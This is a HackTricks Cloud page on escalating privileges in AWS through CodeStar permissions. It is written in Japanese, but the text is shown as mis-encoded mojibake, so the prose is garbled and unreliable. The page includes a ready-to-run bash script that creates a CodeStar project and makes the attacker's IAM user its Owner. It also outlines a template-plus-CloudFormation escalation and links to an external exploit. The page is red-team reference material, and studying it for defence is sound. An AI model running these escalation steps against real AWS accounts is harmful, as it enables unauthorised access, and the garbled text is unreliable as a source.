# AWS - Codestar Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Codestar

codestarã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ä»¥ä¸‹ã§ç¢ºèªã§ãã¾ã™ï¼š

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**cloudformationãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**ã‚’ä»‹ã—ã¦**ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«**codestar IAMãƒ­ãƒ¼ãƒ«ã‚’æ‚ªç”¨**ã§ãã¾ã™ã€‚æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

ã“ã®æŠ€è¡“ã¯ã€`codestar:CreateProject`ã‚’ä½¿ç”¨ã—ã¦codestarãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã€`codestar:AssociateTeamMember`ã‚’ä½¿ç”¨ã—ã¦IAMãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ–°ã—ã„CodeStar **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ**ã®**æ‰€æœ‰è€…**ã«ã™ã‚‹ã“ã¨ã§ã€**ã„ãã¤ã‹ã®è¿½åŠ æ¨©é™ã‚’æŒã¤æ–°ã—ã„ãƒãƒªã‚·ãƒ¼ã‚’ä»˜ä¸**ã—ã¾ã™ã€‚
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
ã‚‚ã—ã‚ãªãŸãŒã™ã§ã«**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ãƒ³ãƒãƒ¼**ã§ã‚ã‚Œã°ã€æ¨©é™**`codestar:UpdateTeamMember`**ã‚’ä½¿ç”¨ã—ã¦**å½¹å‰²ã‚’ã‚ªãƒ¼ãƒŠãƒ¼ã«æ›´æ–°**ã§ãã¾ã™ã€‚`codestar:AssociateTeamMember`ã®ä»£ã‚ã‚Šã«ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** codestarãƒãƒªã‚·ãƒ¼ã¸ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã€‚ä»¥ä¸‹ã®ãƒãƒªã‚·ãƒ¼ã®ä¾‹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆ:**
* **`codestar:CreateProjectFromTemplate`**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦æ–°ã—ã„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä½œæˆã‚’é–‹å§‹ã—ã¾ã™ã€‚
* ä½œæˆãŒæˆåŠŸã™ã‚‹ã¨ã€**`cloudformation:UpdateStack`**ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒè‡ªå‹•çš„ã«ä»˜ä¸ã•ã‚Œã¾ã™ã€‚
* ã“ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã€`CodeStarWorker-<generic project name>-CloudFormation` IAMãƒ­ãƒ¼ãƒ«ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸã‚¹ã‚¿ãƒƒã‚¯ã‚’ç‰¹ã«å¯¾è±¡ã¨ã—ã¾ã™ã€‚
2. **ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚¹ã‚¿ãƒƒã‚¯ã‚’æ›´æ–°:**
* ä»˜ä¸ã•ã‚ŒãŸCloudFormationæ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€æŒ‡å®šã•ã‚ŒãŸã‚¹ã‚¿ãƒƒã‚¯ã‚’æ›´æ–°ã—ã¾ã™ã€‚
* ã‚¹ã‚¿ãƒƒã‚¯ã®åå‰ã¯é€šå¸¸ã€æ¬¡ã®2ã¤ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ã„ãšã‚Œã‹ã«å¾“ã„ã¾ã™ï¼š
* `awscodestar-<generic project name>-infrastructure`
* `awscodestar-<generic project name>-lambda`
* æ­£ç¢ºãªåå‰ã¯é¸æŠã—ãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«ä¾å­˜ã—ã¾ã™ï¼ˆä¾‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å‚ç…§ï¼‰ã€‚
3. **ã‚¢ã‚¯ã‚»ã‚¹ã¨æ¨©é™:**
* æ›´æ–°å¾Œã€ã‚¹ã‚¿ãƒƒã‚¯ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸ**CloudFormation IAMãƒ­ãƒ¼ãƒ«**ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸæ©Ÿèƒ½ã‚’å–å¾—ã—ã¾ã™ã€‚
* æ³¨æ„: ã“ã‚Œã¯æœ¬è³ªçš„ã«å®Œå…¨ãªç®¡ç†è€…æ¨©é™ã‚’æä¾›ã™ã‚‹ã‚‚ã®ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚æ¨©é™ã‚’ã•ã‚‰ã«æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«ã¯ã€ç’°å¢ƒå†…ã®è¿½åŠ ã®èª¤è¨­å®šã•ã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ãŒå¿…è¦ã«ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€å…ƒã®ç ”ç©¶ã‚’ç¢ºèªã—ã¦ãã ã•ã„: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/)ã€‚\
ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯[https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ½œåœ¨çš„ãªå½±éŸ¿:** cloudformation IAMãƒ­ãƒ¼ãƒ«ã¸ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
